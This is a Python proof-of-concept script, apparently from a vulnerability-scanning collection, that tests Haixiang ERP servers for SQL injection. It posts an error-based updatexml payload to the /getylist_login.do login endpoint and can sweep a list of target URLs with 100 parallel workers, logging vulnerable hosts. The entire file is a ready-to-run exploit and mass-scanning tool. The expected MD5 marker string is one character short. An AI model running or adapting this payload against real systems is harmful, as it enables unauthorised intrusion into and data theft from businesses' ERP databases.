# 海翔ERP—SQL注入漏洞
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错

# 指纹模块
def banner():
    banner = """
   ______ _____  _____     _____          _____  
 |  ____|  __ \|  __ \   / ____|   /\   |  __ \ 
 | |__  | |__) | |__) | | |  __   /  \  | |__) |
 |  __| |  _  /|  ___/  | | |_ | / /\ \ |  ___/ 
 | |____| | \ \| |      | |__| |/ ____ \| |     
 |______|_|  \_\_|       \_____/_/    \_\_|     
                                                
                                                                                                     
                    author:           guoguo12138
                    version:          1.0.5
                    For:              海翔ERP-sql注入漏洞 
"""
    print(banner)

# poc模块
def main():
    # banner()
    parser = argparse.ArgumentParser(description="海翔ERP—SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='intput link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = '/getylist_login.do'
    url = target + payload_url
    header = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
        "Content-Length": "0",
    }
    data = "accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--+"
    try:
        res2 = requests.post(url=target+payload_url, headers=header, data=data, verify=False)
        if res2.status_code == 500:
            if "e10adc3949ba59abbe56e057f20f883" in res2.text:
                print(f"[+] 该url{target}存在信息泄露")
                with open("result.txt", "a") as fp:
                    fp.write(f"{target}" + "\n")
            else:
                print(f"[-] 该url{target}不存在信息泄露")
    except Exception as e:
        print(f'[*] 该url{target}可能存在访问问题，请手工测试')

if __name__ == '__main__':
    main()